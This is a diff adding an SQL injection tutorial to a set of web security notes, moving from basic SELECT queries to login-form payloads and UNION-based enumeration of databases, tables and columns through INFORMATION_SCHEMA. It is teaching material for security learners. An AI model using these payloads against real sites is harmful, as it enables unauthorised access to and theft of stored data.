@@ -234,3 +234,123 @@ When looking, like here, for ```ID```, ```name``` or any other type of ```token`
 
 ## SQLi
 
+SQL is a language that allows us to ask information to a database. This information can be name, adress, date, password... It can be anything we want. These queries are made in a DBMS (```DataBase Management System```), the most famous are ```SQLite```, ```MySQL```, ```MariaDB```, ```Microsoft SQL Server``` or even ```Oracle DBMS```. The goal here is not to teach you how SQL work or what are all the differences between tow DBMS but you can read [this article](https://www.altexsoft.com/blog/business/comparing-database-management-systems-mysql-postgresql-mssql-server-mongodb-elasticsearch-and-others/) for more information. We are just going to see the bases so you are not completely lost but I advise you to follow some courses about the SQL language.
+
+### Definition
+
+For this example, we are going to imagine a database of a school with professors and students:
+
+![image](https://user-images.githubusercontent.com/73934639/189689960-0ecc2be0-e986-41d8-ba71-6448a65c4c18.png){: width="600" height="300" }
+
+As you can see there are two teachers and two students. Professor and Teacher are the two ```tables``` of the database. It can be seen as an array containing different data. Each one has an id, a name and a surname those are the ```attributes``` ot the tables. ```ID``` is usually used to differentiate two ```entry``` of a table. We could have a student and a professor that have the same name and the same surname. If this happens and we don't have an ```ID``` how can we differentiate them ? For each ```entry```, we have several ```value```. For the first professor, the ```value``` for the id is ```1```, for the name it's ```name1``` and for the surname it's ```sur1```. As I said, ID need to be different to differentiate two students or two professors but I'm talking about ID of a certain ```table```. Of course ```we can have a student with the same ID as a professor``` because they are not in the same table.
+
+### Basic SQL Commands
+
+Now that you have a better understanding of a database, we can look on how to recover that data. The most common way is to recover all entries of a table :
+
+```sql
+SELECT * FROM STUDENT;
+```
+
+If we want to look for specific attributes, we can do :
+
+```sql
+SELECT name, surname FROM STUDENT;
+```
+
+Here we don't have much student but if we had hundred of them, we could display all students that have an id greater than 50 like this :
+
+```sql
+SELECT name, surname FROM STUDENT WHERE id > 50 ;
+```
+
+As I said previously, we are not going in depth into SQL and it's query so you may want to look at some online courses about the SQL language and its queries.
+
+> Note that SQL queries isn't case sensitive. It means that you can write ```SELECT``` or ```select```.
+{: .prompt-note }
+
+### Common SQLi
+
+The most common SQLi is in connection forms. You are asked to give a username and password. If I enter my credentials, the query may look like the following one and if there is no entry returned, it means that I gave a wrong password and/or a wrong user.
+
+```sql
+SELECT * FROM usertable WHERE profileID='batbato' AND password = 'batbato'
+```
+
+But what happens if I put as a user an apostrophe (```'```) ? The query will look like :
+
+```sql
+SELECT * FROM usertable WHERE profileID=''' AND password = 'batbato'
+```
+
+> Note that inputting an apostrophe (```'```) or a quote (```"```) can print an error message if the debugger mode has not been disabled.
+{: .prompt-tip }
+
+This will result in an error. But we can comment on the rest of the command so that the command will only look for the username. Comments can be ```-- -COMMENT``` or ```#COMMENT```.
+
+```sql
+SELECT * FROM usertable WHERE profileID='admin' -- -' AND password = 'batbato'
+```
+
+This command where our user is ```admin' -- -``` is equivalent to :
+
+```sql
+SELECT * FROM usertable WHERE profileID='admin'
+```
+
+But what if the admin username isn't "admin" ? We can use the well-known payload ```OR 1=1``` (equivalent to ```OR True```) so that we get the first user :
+
+```sql
+SELECT * FROM usertable WHERE profileID='admin' OR 1=1 -- -' AND password = 'batbato'
+```
+
+> Note that the apostrophe is important ! If the ```profileID``` is a decimal, it may not require an apostrophe and if the query use quote (```"```) then your payload should contain quotes instead of apostrophes.
+{: .prompt-warning }
+
+### UNION
+
+In SQL, we can use the ```UNION``` to combine the result-set of two or more ```SELECT``` statements.
+ex:
+```sql
+SELECT column_name(s) FROM table1
+UNION
+SELECT column_name(s) FROM table2; 
+```
+Instead of the connection form, here we are going to look at something like a search bar. First we need to look for the number of columns of the query. We will try to input :
+
+```sql
+' UNION SELECT NULL -- -
+```
+
+If this doesn't print ```NULL```, we can try :
+
+```sql
+' UNION SELECT NULL, NULL -- -
+```
+
+Again and again until we see the ```NULL``` where the result should be output. For the rest of the example we are going to assume we have two columns.
+We look for the name of the database with ```schema_name``` from the table ```INFORMATION_SCHEMA.SCHEMATA```:
+
+```sql
+' UNION SELECT 1,schema_name FROM INFORMATION_SCHEMA.SCHEMATA -- -
+```
+
+We obtain all the databases names. Image we found the database ```SCHOOL``` from the previous example. We look for the tables it contains :
+
+```sql
+' UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='SCHOOL' -- -
+```
+
+If we want to have a look at the ```Student``` table, we can list the names of the columns like that :
+
+```sql
+' UNION SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
+```
+
+We get the name and the surname with :
+
+```sql
+' UNION SELECT name, surname FROM Student -- -
+```
+
+If there are some protections, you can try to bypass them by encoding your queries, changing the case... This [PortSwigger article](https://portswigger.net/support/sql-injection-bypassing-common-filters) can explain it to you.
